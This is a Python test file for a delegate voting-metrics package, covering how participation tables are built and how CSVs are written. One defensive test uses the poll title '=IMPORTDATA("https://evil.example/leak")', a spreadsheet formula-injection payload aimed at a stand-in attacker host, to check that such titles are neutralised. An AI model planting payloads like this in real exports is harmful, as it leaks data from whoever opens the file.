"""Tests for outputs — the participation table and the CSV writers."""

from datetime import UTC, date, datetime

import pandas as pd
import pytest

from ad_voting_metrics import outputs
from ad_voting_metrics.outputs import PARTICIPATION_METADATA_COLUMNS, build_participation_dataframe, write_csvs


def _make_participation_df():
    """3-delegate, 2-poll, 1-spell metrics frame."""
    return pd.DataFrame(
        {
            "Delegate Name": ["BLUE", "Cloaky", "BONAPUBLICA"],
            "Delegate Contract": ["0xaaa", "0xbbb", "0xccc"],
            "Start Date": [date(2025, 12, 1)] * 3,
            "12345": ["Yes", "No", "Yes"],
            "67890": ["Pending verification", "Yes", "Yes"],
            "0xspell001": ["Yes", "No Delegated SKY", "Yes"],
        }
    )


def _make_poll_info():
    return [
        {"pollId": 12345, "startDate": date(2026, 4, 5), "endDate": date(2026, 4, 7), "title": "Approve SubDAO X"},
        {"pollId": 67890, "startDate": date(2026, 4, 12), "endDate": date(2026, 4, 14), "title": "Adjust risk"},
    ]


def _make_spell_info():
    return [{"address": "0xspell001", "startDate": date(2026, 4, 20), "title": "Spell: April risk adjustment"}]


# ---------------------------------------------------------------------------
# build_participation_dataframe
# ---------------------------------------------------------------------------


def test_build_participation_dataframe_one_row_per_poll_with_metadata_then_delegates():
    out = build_participation_dataframe(_make_participation_df(), _make_poll_info(), _make_spell_info())

    assert list(out.columns) == [*PARTICIPATION_METADATA_COLUMNS, "BLUE", "Cloaky", "BONAPUBLICA"]
    assert len(out) == 3
    row = out[out["Poll Id"] == "12345"].iloc[0]
    assert row["Start Date"] == "2026-04-05"
    assert row["End Date"] == "2026-04-07"
    assert row["Title"] == "Approve SubDAO X"
    assert (row["BLUE"], row["Cloaky"], row["BONAPUBLICA"]) == ("Yes", "No", "Yes")


def test_build_participation_dataframe_spell_row_has_blank_end_date():
    out = build_participation_dataframe(_make_participation_df(), _make_poll_info(), _make_spell_info())

    row = out[out["Poll Id"] == "0xspell001"].iloc[0]
    assert row["Start Date"] == "2026-04-20"
    assert row["End Date"] == ""
    assert row["Title"] == "Spell: April risk adjustment"


def test_build_participation_dataframe_unknown_column_keeps_statuses_with_blank_metadata():
    df = pd.DataFrame(
        {
            "Delegate Name": ["BLUE"],
            "Delegate Contract": ["0xaaa"],
            "Start Date": [date(2025, 12, 1)],
            "99999": ["Yes"],
        }
    )

    row = build_participation_dataframe(df, _make_poll_info(), _make_spell_info()).iloc[0]

    assert (row["Poll Id"], row["Start Date"], row["End Date"], row["Title"]) == ("99999", "", "", "")
    assert row["BLUE"] == "Yes"


def test_build_participation_dataframe_sorts_by_start_date_with_unknown_last():
    """Rows come out chronologically regardless of column order; a row with no metadata sorts to the end."""
    df = pd.DataFrame(
        {
            "Delegate Name": ["BLUE"],
            "Delegate Contract": ["0xaaa"],
            "Start Date": [date(2025, 12, 1)],
            "99999": ["Yes"],  # no metadata
            "0xspell001": ["Yes"],  # 2026-04-20
            "67890": ["Yes"],  # 2026-04-12
            "12345": ["Yes"],  # 2026-04-05
        }
    )

    out = build_participation_dataframe(df, _make_poll_info(), _make_spell_info())

    assert list(out["Poll Id"]) == ["12345", "67890", "0xspell001", "99999"]


def test_build_participation_dataframe_zero_polls_returns_header_only():
    df = _make_participation_df()[["Delegate Name", "Delegate Contract", "Start Date"]]

    out = build_participation_dataframe(df, [], [])

    assert list(out.columns) == [*PARTICIPATION_METADATA_COLUMNS, "BLUE", "Cloaky", "BONAPUBLICA"]
    assert len(out) == 0


def test_metadata_by_id_indexes_polls_and_spells_by_string_key():
    lookup = outputs._metadata_by_id(_make_poll_info(), _make_spell_info())

    assert lookup["12345"]["title"] == "Approve SubDAO X"
    assert lookup["0xspell001"]["title"] == "Spell: April risk adjustment"
    assert "nope" not in lookup


@pytest.mark.parametrize(
    ("value", "expected"),
    [
        (None, ""),
        (date(2026, 4, 1), "2026-04-01"),
        (datetime(2026, 4, 1, 13, 30, tzinfo=UTC), "2026-04-01"),
        (pd.Timestamp("2026-04-01"), "2026-04-01"),
    ],
)
def test_coerce_date(value, expected):
    assert outputs._coerce_date(value) == expected


# ---------------------------------------------------------------------------
# write_csvs
# ---------------------------------------------------------------------------


def _daily():
    return pd.DataFrame([{"contract": "0xaaa", "name": "blue", "date": date(2026, 4, 1), "sky": 100.0, "rank": 1}])


def test_write_csvs_creates_the_directory_and_writes_both_files(tmp_path):
    out_dir = tmp_path / "2026-04"

    result = write_csvs(out_dir, _daily(), _make_participation_df(), _make_poll_info(), _make_spell_info())

    assert [p.relative_to(tmp_path).as_posix() for p in result] == ["2026-04/sky.csv", "2026-04/vote_participation.csv"]
    assert all(p.exists() for p in result)
    assert (out_dir / "sky.csv").read_text().splitlines()[0] == "contract,name,date,sky,rank"


def test_write_csvs_defuses_formula_like_titles(tmp_path):
    """API-sourced titles starting with a formula character are quoted so spreadsheet apps render them as text."""
    poll_info = [
        {
            "pollId": 12345,
            "startDate": date(2026, 4, 5),
            "endDate": date(2026, 4, 7),
            "title": '=IMPORTDATA("https://evil.example/leak")',
        }
    ]

    write_csvs(tmp_path, _daily(), _make_participation_df(), poll_info, [])

    participation = (tmp_path / "vote_participation.csv").read_text()
    assert "'=IMPORTDATA" in participation
    assert '"=IMPORTDATA' not in participation
